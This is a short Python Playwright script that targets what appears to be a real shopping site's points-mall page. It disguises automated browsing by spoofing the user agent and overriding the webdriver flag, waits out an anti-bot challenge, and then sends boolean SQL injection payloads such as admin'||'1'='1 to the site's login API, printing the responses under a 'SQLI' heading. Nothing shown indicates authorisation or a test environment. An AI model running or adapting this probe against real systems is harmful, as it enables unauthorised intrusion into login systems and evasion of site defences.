import os
from playwright.sync_api import sync_playwright
U=os.environ.get('PROBE_URL','https://m.lbtek.com/points-mall')
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto(U, wait_until='domcontentloaded', timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000); c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async () => {
      const out={};
      const post=async(n,bd)=>{try{const r=await fetch('/api/v1/auth/unifiedLogin',{method:'POST',headers:{'Content-Type':'application/json','lang':'zh-CN'},body:JSON.stringify(bd)});out[n]=r.status+'|'+(await r.text()).slice(0,260);}catch(e){out[n]='ERR '+String(e).slice(0,100);}};
      await post('t_true',{identifier:"admin'||'1'='1",password:'x'});
      await post('t_false',{identifier:"admin'||'1'='2",password:'x'});
      await post('t_sq',{identifier:"admin'",password:'x'});
      return out;
    }""")
    print('===== SQLI =====',flush=True)
    for k,v in res.items(): print('%-8s %s'%(k,v),flush=True)
    b.close()
